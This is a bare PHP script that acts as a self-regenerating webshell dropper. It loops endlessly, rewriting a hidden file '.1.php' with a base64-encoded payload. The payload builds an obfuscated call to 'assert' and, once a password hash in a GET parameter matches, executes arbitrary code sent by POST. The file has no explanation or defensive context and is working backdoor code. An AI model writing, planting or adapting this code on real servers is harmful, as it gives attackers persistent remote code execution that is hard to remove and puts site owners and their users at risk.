<?php

set_time_limit(0);

ignore_user_abort(true);

$file = '.1.php';

$shell = 

"PD9waHAKCSRzdHIxID0gJ2FIKFVVSChmc2RmSChVVUgoZnNkZixmZGdkZWZqZzBKKXImJUYlKl5HKnQnOwoJJHN0cjIgPSBzdHJ0cigkc3RyMSxhcnJheSgnYUgoVVVIKGZzZGZIKFVVSChmc2RmLCc9PidhcycsJ2ZkZ2RlZmpnMEopJz0+J3NlJywnciYlRiUqXkcqdCc9PidydCcpKTsKCSRzdHIzID0gc3RydHIoJHN0cjIsYXJyYXkoJ3MsJz0+J3MnLCdmZGdkZWZqZzBKKXImJUYlKl5HKic9PidlcicpKTsKCWlmKG1kNShAJF9HRVRbJ2EnXSkgPT0nMjg1OGI5NThmNTkxMzg3NzFlYWUzYjBjMmNlZGE0MjYnKXsKCQkkc3RyNCA9IHN0cnJldigkX1BPU1RbJ2EnXSk7CgkJJHN0cjUgPSBzdHJyZXYoJHN0cjQpOwoJCSRzdHIzKCRzdHI1KTsKICAgIH0KPz4=";

while(true){

    file_put_contents($file,base64_decode($shell));

    usleep(50);

}

?>